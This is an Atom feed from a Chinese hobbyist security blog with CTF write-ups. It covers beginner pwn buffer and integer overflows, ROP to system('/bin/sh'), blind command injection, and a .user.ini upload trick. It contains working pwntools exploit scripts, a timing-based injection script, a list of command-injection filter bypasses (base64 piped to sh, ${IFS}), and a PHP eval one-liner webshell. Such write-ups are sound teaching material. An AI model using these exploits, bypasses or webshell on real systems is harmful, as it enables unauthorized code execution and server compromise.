<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zhangzy999.github.io/</id>
    <title>Cyurl3_BLOG</title>
    <updated>2020-06-01T14:26:18.323Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zhangzy999.github.io/"/>
    <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
    <subtitle>我是一个热爱信息安全和记录生活的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。</subtitle>
    <logo>https://zhangzy999.github.io/images/avatar.png</logo>
    <icon>https://zhangzy999.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Cyurl3_BLOG</rights>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—int_overflow]]></title>
        <id>https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/</id>
        <link href="https://zhangzy999.github.io/post/gong-fang-shi-jie-pwn-xin-shou-qu-int_overflow/">
        </link>
        <updated>2020-06-01T12:43:12.000Z</updated>
        <content type="html"><![CDATA[<p>听名字就是整数溢出<br>
先学习下什么是整数溢出</p>
<h1 id="整数溢出知识">整数溢出知识</h1>
<p>看那种官方的说明看的头大，直接说说我对整数溢出的理解emm<br>
整数溢出，顾名思义就是整数溢出来了，什么是“溢出来”，就是256 = 0，65536 = 0 之类的<br>
我们看个例子  我们在c语言中，用char定义一个变量c，用来存放一个1字节8个二进制位的数据<br>
现在的书本也好，教师也好，总喜欢把char讲成定义字符型变量，其实不是的，char来定义变量的时候，本质就是为一个变量开辟一个字节的内存用来存放数据，这一个字节的空间是由我们任意支配的，想存什么类型的数据都可以，只不过大家都习惯存字符型的而已，跑题了（</p>
<pre><code class="language-c">char c = 1;
</code></pre>
<p>那么在内存中就是 0000 0001<br>
如果是c = -1<br>
那么在内存中就是 1000 0001<br>
1代表符号位<br>
那么思考下，c可存储的范围是多少呢？ 是 -128—127<br>
如果c = 127，即 0111 1111 那么c = c+1，再打印一下c是多少呢？<br>
<img src="https://zhangzy999.github.io//post-images/1591016175946.png" alt="" loading="lazy"><br>
神奇的事情发生了，打印出来是-128，其实也不神奇，因为0111 1111 + 0000 0001 = 1000 0000  = -128<br>
<img src="https://zhangzy999.github.io//post-images/1591016444486.png" alt="" loading="lazy"><br>
如果是无符号类型的话，表示的范围就是0—255<br>
我们看代码</p>
<pre><code class="language-c">unsigned char c = 256;
printf(&quot;%d\n&quot;,c);
</code></pre>
<p>这样又会变成什么呢？思考一下 256 = 255 + 1<br>
也就是 1111 1111 + 1 结果等于 (0001)0000 0000 然而我们内存只给它开辟了一个字节的空间，所以结果会等于零，dev上运行一下看看<br>
<img src="https://zhangzy999.github.io//post-images/1591016989930.png" alt="" loading="lazy"><br>
这就是整数溢出的原理，这是最简单的unsigned char情况，对于word，dword情况也一样</p>
<h1 id="解题">解题</h1>
<h2 id="题目分析">题目分析</h2>
<p>我们运行一下程序看看是什么情况<br>
<img src="https://zhangzy999.github.io//post-images/1591018218857.png" alt="" loading="lazy"><br>
简单的一个模拟登录的功能，接着我们查看一下开启了哪些保护机制<br>
<img src="https://zhangzy999.github.io//post-images/1591018245408.png" alt="" loading="lazy"><br>
栈不可执行保护被打开了，我们直接IDA来看看main函数叭<br>
<img src="https://zhangzy999.github.io//post-images/1591018283129.png" alt="" loading="lazy"><br>
我们跟进去login函数<br>
<img src="https://zhangzy999.github.io//post-images/1591018316958.png" alt="" loading="lazy"><br>
有一个check密码的函数，我们跟进去看看<br>
<img src="https://zhangzy999.github.io//post-images/1591018361068.png" alt="" loading="lazy"><br>
发现strcpy函数，这个函数可能会存在溢出，发现是把s赋给dest，而s的空间又大于dest，所以存在溢出（s即我们在login函数里面传入的参数buf），但是关键是上面有一个判断长度的if判断语句，所以我们得想办法来绕过if判断<br>
看到v3是unsigned char类型的（即IDA中的unsigned __int8），要求v3在4—8之间<br>
根据之前讲解的就可以使用整数溢出来绕过if判断<br>
256 = 0，那么260 = 4，目标明确了，然后找偏移量<br>
<img src="https://zhangzy999.github.io//post-images/1591020302218.png" alt="" loading="lazy"><br>
奈斯，然后发现一个奇奇怪怪的函数<br>
<img src="https://zhangzy999.github.io//post-images/1591020348124.png" alt="" loading="lazy"><br>
奈斯，然后找到cat flag的地址<br>
<img src="https://zhangzy999.github.io//post-images/1591020376308.png" alt="" loading="lazy"><br>
万事具备，只欠exp</p>
<h2 id="exp编写">exp编写</h2>
<pre><code class="language-python">from pwn import *

ip = '124.126.19.106'
port = '37599'
r = remote(ip,port)

system_addr = 0x08048694
offset = 0x14 + 0x4    #加4是覆盖原函数的ebp的值
p32_system_addr = 0x4    #这个是p32发过去system的地址所占的4个字节，在整数溢出的时候要注意一下这个点    
unsigned_int_flow = 260 - offset - p32_system_addr    

payload = 'A' * offset + p32(system_addr) + 'A' * unsigned_int_flow

r.recvuntil('Your choice:')
r.sendline('1')

r.recvuntil('Please input your username:')
r.sendline('Hello')

r.recvuntil('Please input your passwd:')
r.sendline(payload)
r.interactive()
</code></pre>
<p>然后就是flag辣，奈斯<br>
<img src="https://zhangzy999.github.io//post-images/1591020622027.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—guess_num]]></title>
        <id>https://zhangzy999.github.io/post/ad5_guess_num/</id>
        <link href="https://zhangzy999.github.io/post/ad5_guess_num/">
        </link>
        <updated>2020-06-01T02:42:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="srand函数和rand函数">srand()函数和rand()函数</h1>
<h2 id="引用">引用</h2>
<p>解这个题首先我们要了解下srand()和rand()</p>
<blockquote>
<p>要计算机产生一个随机数不像扔色子一样，计算机的每一步操作，就是执行一堆代码，这些代码是事先安排好的，所以计算机的产生行为是不具有随机性和预测性的（当然这里说的是现阶段的计算机体系，到未来的计算机的体系，未知），所以计算机产生的随机数都不是真正意义上的随机数，只是伪随机数，他以一个真值（也称为种子）作为初始条件，然后用一定的算法不停迭代产生随机数。库函数中系统提供了两个函数用于产生随机数：srand()和rand()<br>
rand函数：rand的内部是用线性同余法做的，不是真的随机数，只不过因为其周期特别长，所以在一定范围内可以看成是随机的，rand()会返回一随机值，范围在0到RAND_MAX间，在调用此函数产生随机数前，必须利用srand()设好随机数种子，若没有设随机数种子，rand()在调用时会自动设随机数种子为1。<br>
返回值：返回0到RAND_MAX之间的整数值，RAND_MAX的范围最少在32767之间（int），即双字节（16位）。若unsigned int双字节是65535，且0-RAND_MAX每个数字被选中的随机率是相同的。  rand()产生的是假随机数，每次执行时是相同的，若要不同以不同的值来初始化，初始化的函数就是srand()<br>
srand函数：and()用来设置rand()产生随机数时的随机数种子，参数seed必须是整数，通常可以用time(0)的返回值作为seed.如果每次seed都设置相同的值，rand()产生的随机数值每次都一样。<br>
srand(unsigned)time(NULL))使用系统定时/计数器的值作为随机种子每个种子对应一组根据算法预先生成的随机数，所以在相同平台的环境下，不同时间产生的随机数是不同的，相应的若将srand(unsigned)tima(NULL)改为任一常量，则无论何时运行，运行多少次得到的随机数都是一组特定的序列，所以srand生成的随机数是伪随机数。但是，所谓的“伪随机数”指的并不是假的随机数，其实绝对的对技术只是一种假想状态的随机数，计算机只能生成相对的随机数，而这些随机数既是随机的又是有规律的，一部分遵守一定规律，一部分则不遵守任何规律，总结来说就是：计算机产生伪随机数而不是绝对的随机数<br>
在每次产生随机序列前，先指定不同的种子，这样计算出来的随机序列就不完全相同了，而使用同种子相同的数调用rand()会导致相同的随机数序列被生成</p>
</blockquote>
<h2 id="总结">总结</h2>
<p>总结一下上面的文本：srand()函数为rand()函数指定随机数种子，如果没有srand()函数，那么rand()函数的默认随机数种子就是1，那么为什么称rand()生成的数是伪随机数呢？这是因为，如果每次随机数种子一样，那么每次生成的随机数都是一样的，比如srand(1) ，那么每次的rand()出来的数字都是一样的，所以为了随机性得到提高，我们一般是用时间函数来作为随机数种子，因为时间时刻在变化，所以种子也在变化，那么随机性就会大大提高。</p>
<h1 id="解题">解题</h1>
<h2 id="题目分析">题目分析</h2>
<p>我们拿到附件后，先运行一下看看程序是什么功能<br>
<img src="https://zhangzy999.github.io//post-images/1590981254204.png" alt="" loading="lazy"><br>
大致就是让我们输入名字，然后让我们猜随机数<br>
我们看看程序开启了哪些保护<br>
<img src="https://zhangzy999.github.io//post-images/1590981270245.png" alt="" loading="lazy"><br>
看到保护之后瞬间不想做了:-(    金丝雀 nx 地址随机化 神马的都开了 （话说我好像在新手区）<br>
不管了，IDA分析一下  先看main函数的代码  发现了几个有意思的点<br>
<img src="https://zhangzy999.github.io//post-images/1590981279421.png" alt="" loading="lazy"><br>
首先是gets输入名字  输入的字符串存到v9变量里面  那么漏洞应该就在这里没错了<br>
接下来设置了一个随机数种子，当然，这个随机数种子的随机性肯定是没问题的<br>
接下来是个for循环，让我们猜10个随机数，如果失败就退出程序，如果成功就运行for循环外面的那个函数<br>
我们跟进去那个函数看看<br>
<img src="https://zhangzy999.github.io//post-images/1590981291748.png" alt="" loading="lazy"><br>
奈斯，直接cat flag，所以我们的任务就是来猜数字，不过是随机数，我们肯定即使是欧皇附体也是猜不到的，所以考虑gets那里溢出来覆盖随机数种子seed[0]，让种子变成一个常数，那么每次的随机数都一样，自然也就可预测了，我们查看一下偏移量<br>
<img src="https://zhangzy999.github.io//post-images/1590981299498.png" alt="" loading="lazy"><br>
然后就直接写exp</p>
<h2 id="编写exp">编写exp</h2>
<p>这个exp比之前的要略微复杂一些，经过查资料发现ctypes这个包很奈斯，里面的cdll.LoadLibrary()函数可以在在脚本中加载动态库，同时又能调用库中的函数，那么我们直接可以通过调用对象的srand()方法来确定种子，那我们就不用再编写c语言程序来确定随机数了，比较方便哈<br>
通过命令ldd来确定库的路径</p>
<pre><code>ldd filename
</code></pre>
<p>这样就得到了库位置（忘记截图了，懒的再回虚拟机截了）<br>
然后直接写exp</p>
<pre><code class="language-python">from pwn import *
import ctypes

ip = '124.126.19.106'
port = '49021'
r = remote(ip,port)

elf = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
elf.srand(1) #可写可不写，因为默认就是1
offset = 0x20

payload = 'A' * offset + p64(1)
r.recvuntil('Your name:')
r.sendline(payload)
for i in range(0,10):
        number = str(elf.rand()%6 + 1)    #这个地方比较坑，因为r.sendline()的参数是字符类型，所以我们得把数值类型转成字符类型
        r.recvuntil('Please input your guess number:')
        r.sendline(number)
r.interactive()
</code></pre>
<p>然后就是flag辣<br>
<img src="https://zhangzy999.github.io//post-images/1590980821050.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—level2]]></title>
        <id>https://zhangzy999.github.io/post/ad_world_level2/</id>
        <link href="https://zhangzy999.github.io/post/ad_world_level2/">
        </link>
        <updated>2020-05-31T09:19:24.000Z</updated>
        <content type="html"><![CDATA[<p>我们拿到程序，先运行一下，发现没有特别的地方<br>
查看程序的保护机制<br>
<img src="https://zhangzy999.github.io//post-images/1590916932032.png" alt="" loading="lazy"><br>
发现开启了NX保护，就是栈不可执行（ctfwiki上好像有详细说明）<br>
查看main函数<br>
<img src="https://zhangzy999.github.io//post-images/1590916884104.png" alt="" loading="lazy"><br>
发现有一个vul这个函数，跟进去看看<br>
<img src="https://zhangzy999.github.io//post-images/1590916914164.png" alt="" loading="lazy"><br>
首先我们得到偏移为0x88+0x4：这个程序为32位程序，所以main函数中的ebp的值在栈上是32位，也就是4个字节，所以加0x4才能到达函数的返回地址<br>
这个题是提示我们是ROP，那自然想到找一下system函数的地址和&quot;/bin/sh&quot;字符串的地址，先找下system的<br>
<img src="https://zhangzy999.github.io//post-images/1590917154785.png" alt="" loading="lazy"><br>
奈斯，接着shift+f12找binsh<br>
<img src="https://zhangzy999.github.io//post-images/1590917179756.png" alt="" loading="lazy"><br>
然后跟进去，发现binsh字符串的地址<br>
<img src="https://zhangzy999.github.io//post-images/1590917197459.png" alt="" loading="lazy"><br>
然后直接写exp打一下<br>
不过有个点要注意，system函数调用后会有一个返回地址，我们直接用p32函数写个零进去就行（或者写私四个垃圾字符'aaaa'之类的，因为我们只要拿到shell就行了）</p>
<pre><code class="language-python">from pwn import *

ip = '124.126.19.106'
port = '30353'
r = remote(ip,port)

offset = 0x88 + 0x4
system_addr = 0x08048320
binsh_addr = 0x0804a024

payload = 'A' * offset + p32(system_addr) + p32(0) + p32(binsh_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<p>奈斯，然后直接cat flag<br>
<img src="https://zhangzy999.github.io//post-images/1590917362749.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—level0]]></title>
        <id>https://zhangzy999.github.io/post/adworld_level0/</id>
        <link href="https://zhangzy999.github.io/post/adworld_level0/">
        </link>
        <updated>2020-05-28T23:24:59.000Z</updated>
        <content type="html"><![CDATA[<p>下载附件，简单运行一下，发现出现一个hello world然后让我们输入一个字符串，然后就退出程序……<br>
我们拿到ida里面看一看<br>
<img src="https://zhangzy999.github.io//post-images/1590708401179.png" alt="" loading="lazy"><br>
发现有一个vul这种函数，我们跟进去看看<br>
<img src="https://zhangzy999.github.io//post-images/1590708423813.png" alt="" loading="lazy"><br>
发现buf这个变量向堆栈申请了80h这个长度，也就是128个字节，但是我们可以输入200个字节，这个就很危险了，可以确定偏移量为80h+8没错了，我们就是要先填充垃圾字符搞一下80h+8，然后将函数的返回地址改写成system至于为啥是80h+8，放个图，就不解释了（汇编画画堆栈图就知道啦）<br>
<img src="https://zhangzy999.github.io//post-images/1590708690016.png" alt="" loading="lazy"><br>
然后还发现有system函数<br>
<img src="https://zhangzy999.github.io//post-images/1590708707600.png" alt="" loading="lazy"><br>
我们一路跟进去，找找函数地址在哪<br>
<img src="https://zhangzy999.github.io//post-images/1590708724959.png" alt="" loading="lazy"><br>
完美，拿到了函数地址，那么构造exp就很简单了：</p>
<pre><code class="language-python">from pwn import *

r = remote('124.126.19.106','35956')

offset = 0x80 + 8
system_addr = 0x400596

payload = offset * 'A' + p64(system_addr)

r.sendline(payload)
r.interactive()
</code></pre>
<p>直接拿到shell了<br>
<img src="https://zhangzy999.github.io//post-images/1590708766436.png" alt="" loading="lazy"><br>
cat /flag 就完辣</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界pwn新手区—hello_pwn]]></title>
        <id>https://zhangzy999.github.io/post/adworld_hello_pwn/</id>
        <link href="https://zhangzy999.github.io/post/adworld_hello_pwn/">
        </link>
        <updated>2020-05-28T11:14:02.000Z</updated>
        <content type="html"><![CDATA[<p>我们拿到附件后，然后简单的运行一下，发现程序让我们输入一个字符串，然后就没了（草率.jpg)<br>
<img src="https://zhangzy999.github.io//post-images/1590664509396.png" alt="" loading="lazy"><br>
然后我们检查一下程序开启了哪些保护</p>
<pre><code>checksec filename
</code></pre>
<p>发现开启了NX保护（使得栈上的数据不可执行）<br>
<img src="https://zhangzy999.github.io//post-images/1590664569065.png" alt="" loading="lazy"><br>
我们用ida64位打开，直接看main的伪代码，发现一个read函数和一个if判断<br>
<img src="https://zhangzy999.github.io//post-images/1590664604117.png" alt="" loading="lazy"><br>
如果满足if条件，就能执行下面的一个函数，我们跟进这个函数，发现它可以cat flag<br>
<img src="https://zhangzy999.github.io//post-images/1590664647984.png" alt="" loading="lazy"><br>
if条件要满足，就能拿到flag，关键是if中的判断咯，我们跟进if的那个变量，发现它距离我们可以控制的那个变量只有四字节，而在read中我们可以输入十个字节，那么就是变量覆盖没跑了<br>
<img src="https://zhangzy999.github.io//post-images/1590664736849.png" alt="" loading="lazy"><br>
我们现在计算器中转下16进制，if中的那个数字到16进制就是0x6E756161是四个字节，美汁汁<br>
写个exp打打就完事了（比攻防世界的第一个题还简单）</p>
<pre><code>from pwn import *

p = remote('124.126.19.106','48949')

offset = 4

payload = offset * 'a' + p64(0x6E756161)

p.recvuntil(&quot;bof&quot;)
p.sendline(payload)
p.interactive()     #先养成良好习惯，加上这句话，免得以后打shellcode的时候忘了加-.-||
</code></pre>
<p>然后拿到flag<br>
<img src="https://zhangzy999.github.io//post-images/1590664968599.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[第三届BJDCTF菜鸡签到记—持续更新wp]]></title>
        <id>https://zhangzy999.github.io/post/di-san-jie-bjdctf-cai-ji-qian-dao-ji-chi-xu-geng-xin-wp/</id>
        <link href="https://zhangzy999.github.io/post/di-san-jie-bjdctf-cai-ji-qian-dao-ji-chi-xu-geng-xin-wp/">
        </link>
        <updated>2020-05-27T11:43:26.000Z</updated>
        <content type="html"><![CDATA[<p>比赛打的细碎，还好赛后出题人说不是针对新手的，要不然我直接自闭:-(<br>
直接wp吧，希望第四届排名能够冲击前100</p>
<h1 id="web">web</h1>
<h2 id="帮帮小红花">帮帮小红花</h2>
<p>赛后复现了一波<br>
这个题目是web里面分数最低的了，但是这个题目很苟<br>
打开题目就是花里胡哨的页面，总之题目告诉我们php后端就一句话</p>
<?php shell_exec($_GET['imagin']); ?>
<p>emm 它只有后门，没有回显的地方，常规思路直接弹个shell玩玩<br>
我Google了一些发现可以利用服务器解析日志dnslog来达到类似的shell效果<br>
有一个提供类似服务的网站，还可以一键生成payload（脚本小子狂喜）<br>
我们直接用dnslog打发现行不通，应该是后端开启了防火墙限制流量之类的（瞎猜的，不过有防火墙是肯定的）或者是服务器没有连接网络<br>
那么应该是bash盲注了，但是我比赛的时候没有注入出来，后来发现脚本中的路径写错了草-.-||<br>
题目中提示我们flag在根目录下，我直接简单的改了改之前sql盲注的脚本，一把梭出来就行了</p>
<pre><code class="language-python">import requests
import time

url = &quot;http://127.0.0.1/flag.php?imagin=&quot;
flag = &quot;BJD{&quot;
flag_list = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789{}&quot;

while True :
    num = 0
    for i in flag_list :
        num = num + 1
        payload = 'grep -e &quot;{}&quot; /flag %26%26 sleep 2'.format(flag + i)
        #%26是&amp;的url编码，这种特殊字符要经过url编码，要不然打不出来-.-|
        start_time = time.time()  #设置发送请求之前的时间
        r = requests.get(url + payload)
        end_time = time.time()  #设置发送请求之后的时间
        if end_time - start_time &gt; 0.5 :
            flag = flag + i
            print(flag)
            break
    if num &gt; 63:
        #此时已经遍历列表，说明flag已经到达结尾
        break
</code></pre>
<p>打一下，就能拿到flag了<br>
<img src="https://zhangzy999.github.io//post-images/1590580947041.PNG" alt="" loading="lazy"></p>
<h2 id="gob">gob</h2>
<p>表面是文件上传，其实是目录穿越<br>
有一个注册功能但是没有卵用，直接注册（或者不注册）到文件上传页面<br>
尝试上传各种php，都被解析成了文本，各种图片马 .htaccess .user.ini都没用<br>
雪殇大佬提示目录穿越在bp中改包<br>
我们打开bp 然后抓包改文件名 改成../../../../flag   然后后面的base64编码的东西解码过了就是flag，感觉比第一题简单，有点儿脑洞的感觉</p>
<h1 id="misc">misc</h1>
<h2 id="questionnaire">questionnaire</h2>
<p>调查问卷，应该是考社工<br>
Google + 百度识图 基本能出来所有的答案<br>
还有一个鸭子的不好出，听师傅们说用百度地图可以找到，还把街道名字给列出来了（tql<br>
其实这题直接f12就出了草<br>
划水签到题<br>
由于第一次玩这种题  感觉还挺有意思的  特地保留了一张图片<br>
<img src="https://zhangzy999.github.io//post-images/1590582813536.png" alt="" loading="lazy"></p>
<h2 id="bincat">/bin/cat</h2>
<p>拿到gif  逐帧提取  然后分离下色道 能看出来是二维码<br>
不会写脚本 直接截图工具手撸  扫描得二维码</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[解决的第一个pwn题目—攻防世界新手区：when_did_you_born]]></title>
        <id>https://zhangzy999.github.io/post/pwn_adworld_birth/</id>
        <link href="https://zhangzy999.github.io/post/pwn_adworld_birth/">
        </link>
        <updated>2020-05-27T01:50:48.000Z</updated>
        <content type="html"><![CDATA[<p>开始pwn了，成为pwn手是我毕生的梦想（🙏<br>
我们简单运行了一下程序，发现就是一个很简单的输入生日和名字的功能<br>
我们拿到ida里面简单看一波伪代码<br>
可以看到v5是不能输入1926，但是要想拿到flag还得是1926，二者冲突了<br>
<img src="https://zhangzy999.github.io//post-images/1590544386227.png" alt="" loading="lazy"><br>
然后发现前面还有一个v4，并且是危险函数gets，我们可以考虑通过v4覆盖v5的值，让v5的值变成1926从而绕过前面的if判断<br>
<img src="https://zhangzy999.github.io//post-images/1590544537541.png" alt="" loading="lazy"><br>
总结思路：首先随便输入一个v5，绕过第一个if判断，然后输入v4，通过v4溢出来覆盖v5，从而达到我们的目的，让程序本身去cat flag，我们也不用搞栈溢出啥的，只是一个单纯的“变量溢出”<br>
直接写个exp打过去就行</p>
<pre><code class="language-python">from pwn import *
p = remote(&quot;124.126.19.106&quot;,&quot;47436&quot;)

offset = 8  #偏移量是8

p.recvuntil(&quot;Birth?&quot;) #这个是到第一个if判断停下来
p.sendline(&quot;hhh&quot;) #我们随便打个东西进去就行

p.recvuntil(&quot;Name?&quot;)
birth = 0x786      #0x786 == 1926
payload = &quot;A&quot;*offset + p64(birth)

p.sendline(payload)
p.interactive()
</code></pre>
<p>然后就拿到了flag<br>
<img src="https://zhangzy999.github.io//post-images/1590546253003.PNG" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GXYCTF2019]Ping Ping Ping—os命令总结]]></title>
        <id>https://zhangzy999.github.io/post/gxyctf2019ping-ping-ping/</id>
        <link href="https://zhangzy999.github.io/post/gxyctf2019ping-ping-ping/">
        </link>
        <updated>2020-05-21T00:34:14.000Z</updated>
        <content type="html"><![CDATA[<p>打开环境，是如下页面<br>
<img src="https://zhangzy999.github.io//post-images/1590021358928.png" alt="" loading="lazy"><br>
应该是让我们用get方法传一个参数ip，然后执行系统的ping命令，我们ls一下看看页面是如何回显的<br>
<img src="https://zhangzy999.github.io//post-images/1590021468013.png" alt="" loading="lazy"><br>
有flag.php和index.php，直接访问不会有回显，猜测flag在注释里面，那我们cat一下flag.php<br>
<img src="https://zhangzy999.github.io//post-images/1590021575630.png" alt="" loading="lazy"><br>
显示&quot;fxck your space&quot;……<br>
应该是过滤了空格emm，那么我们先总结一下os命令执行的常见的绕过方法：<br>
1，过滤空格：</p>
<pre><code>过滤空格：可以用以下字符代替
&lt;&gt;
&lt;
${IFS}
$IFS$1
{cat,flag.php}
</code></pre>
<p>2，过滤关键字或者一些纳入黑名单的敏感文件名：</p>
<pre><code>黑名单	绕过：
拼接：cat test.txt  =  a=c;b=at;c=test;d=.txt $a$b $c$d 
base64编码:  `echo Y2F0IHRlc3QudHh0|base64 -d`
               echo Y2F0IHRlc3QudHh0|base64 -d|bash
               echo Y2F0IHRlc3QudHh0|base64 -d|sh
单双引号：ca''t tes&quot;&quot;t.txt
反斜线：ca\t tes\t.txt
$符号：ca$@t te$9st.txt
cat等价替换：more less head tac tail vim等等……
通配符：
/???/?at ????.???
/???/?[a][t] ????.???
</code></pre>
<p>3，做长度上的限制：</p>
<pre><code>长度限制 绕过：
（&gt;是写入一个文件，但是内容会清空，&gt;&gt;是在文件末尾追加，\是换行符）
echo  &quot;cat\\&quot; &gt; cmd
echo &quot;tes\\&quot;&gt;&gt;cmd
echo &quot;t.txt&quot;&gt;&gt;cmd
sh cmd
</code></pre>
<p>有了以上办法，它既然过滤了空格，我们用以下几种形式来代替</p>
<pre><code>1: ?ip=1|cat${IFS}flag.php
2: ?ip=1|cat&lt;&gt;flag.php
3: ?ip=1|cat&lt;flag.php
4: ?ip=1|{cat,flag.php}
5: ?ip=1|cat$IFS$1flag.php
</code></pre>
<p>前四种方法都是&quot;fxck your symbol!&quot;，猜测是对特殊字符做了过滤，但是cao dan的是我们不知道过滤了啥<br>
<img src="https://zhangzy999.github.io//post-images/1590022142460.png" alt="" loading="lazy"><br>
第五种方法可以！<br>
<img src="https://zhangzy999.github.io//post-images/1590022258690.png" alt="" loading="lazy"><br>
没有fxck your space，space，而是fuck flag……<br>
没事儿，既然能突破前两重限制，那应该离胜利不远了，尝试拼接法拼flag无果后，我们读一下index.php</p>
<pre><code>?ip=1|cat$IFS$1index.php
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://zhangzy999.github.io//post-images/1590022474723.png" alt="" loading="lazy"></figure>
<pre><code class="language-php">&lt;?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
    die(&quot;fxck your symbol!&quot;);
  } else if(preg_match(&quot;/ /&quot;, $ip)){
    die(&quot;fxck your space!&quot;);
  } else if(preg_match(&quot;/bash/&quot;, $ip)){
    die(&quot;fxck your bash!&quot;);
  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
    die(&quot;fxck your flag!&quot;);
  }
  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);
  echo &quot;&lt;pre&gt;&quot;;
  print_r($a);
}
?&gt;
</code></pre>
<p>可以看到上面就是我们的过滤规则了，推荐一个调试正则的网站：https://regex101.com<br>
我们已经突破前两重过滤，我们直接看最后一个带有flag的过滤规则就好<br>
<img src="https://zhangzy999.github.io//post-images/1590022906117.png" alt="" loading="lazy"><br>
可以看到只要有flag出现就不可以，无论它们中间有多少字符，但是咧，不出现flag.php<br>
出现f$a是不会触发正则的，我们可以用拼接法来拼接flag：</p>
<pre><code>?ip=1;a=lag.php;cat$IFS$1f$a;
</code></pre>
<p><img src="https://zhangzy999.github.io//post-images/1590023132426.png" alt="" loading="lazy"><br>
bingo!<br>
当然还有以下三种解法<br>
1，(看源码知道bash被过滤)我们用sh来代替进行base64编码</p>
<pre><code>?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
</code></pre>
<p>2，反引号里面的字符串会被当作命令执行</p>
<pre><code>?ip=1;`echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d`
</code></pre>
<p>3，反引号里面的字符串不仅可以被当作命令执行，命令执行的结果还可被当作输入</p>
<pre><code>?ip=1;cat$IFS$1`ls`   等价于    cat flag.php index.php
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[BUUweb—checkIn，利用.user.ini上传木马]]></title>
        <id>https://zhangzy999.github.io/post/webcheckIn/</id>
        <link href="https://zhangzy999.github.io/post/webcheckIn/">
        </link>
        <updated>2020-05-15T02:17:05.000Z</updated>
        <content type="html"><![CDATA[<p>先放上我向大佬学习的原文章：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">大佬文章</a><br>
我们看看官方手册对于.ini文件的说明：<a href="https://www.php.net/manual/zh/configuration.file.per-user.php">官方PHP手册</a></p>
<blockquote>
<p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。<br>
除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER['DOCUMENT_ROOT'] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
</blockquote>
<p>我们可以看到下图中php.ini里面包含了非常多的php的配置，但是这些配置分成了四种：<br>
<img src="https://zhangzy999.github.io//post-images/1589510286611.png" alt="" loading="lazy"><br>
我们看看官方对于PHP_INI_*模式的定义：<br>
<img src="https://zhangzy999.github.io//post-images/1589510381617.png" alt="" loading="lazy"><br>
可以看到，在PHP_INI_USER模式中，是可以利用.user.ini修改设置的，然而，事实上，除了PHP_INI_SYSTEM外，其余三种模式都可以利用.user.ini来修改设置😶<br>
但是相对敏感的配置选项，都是PHP_INI_SYSTEM模式，也就是说只能通过php.ini或者httpd.conf来设定......<br>
8过，在php的配置中有两个灰常有意思的项：<br>
<img src="https://zhangzy999.github.io//post-images/1589511354756.png" alt="" loading="lazy"><br>
我们点进去看看这俩玩意到底是啥：<a href="https://www.php.net/manual/zh/ini.core.php#ini.auto-append-file">php核心配置选项说明</a></p>
<blockquote>
<p>auto_append_file string:<br>
Specifies the name of a file that is automatically parsed after the main file. The file is included as if it was called with the require function, so include_path is used.<br>
The special value none disables auto-appending.<br>
Note: If the script is terminated with exit(), auto-append will not occur.</p>
</blockquote>
<p>翻译成人话就是：可以在同目录下的php文件后面来一个类似于require()函数的功能解析指定的文件，但是php用exit()终止脚本的话，就不可以辣<br>
auto_prepend_file就是在文件前解析<br>
嗯……这俩功能是蛮强大的8，那么隐藏木马的思路就是先传个.user.ini，然后自动解析一张图片名，然后那个图片实际上是个图片马，这样就达成了目的，要求还是苛刻的，为啥呢？<br>
首先，你在上传到的目录下得有php文件，这是前提要求<br>
第二，当你用于隐藏后门的时候，你得能够上传的了.user.ini文件，也就是说防火墙允许你这样干……<br>
看似苛刻，但是有的CTF赛题却可以用~<br>
下面让我们来康康具体的应用8：[SUCTF 2019]CheckIn<br>
打开环境是一张多么朴实无华的界面呵<br>
<img src="https://zhangzy999.github.io//post-images/1589512236862.png" alt="" loading="lazy"><br>
二话不说来给他干个一句话木马上去</p>
<pre><code class="language-php">&lt;?php @eval($_POST['CyurL3']); ?&gt;
</code></pre>
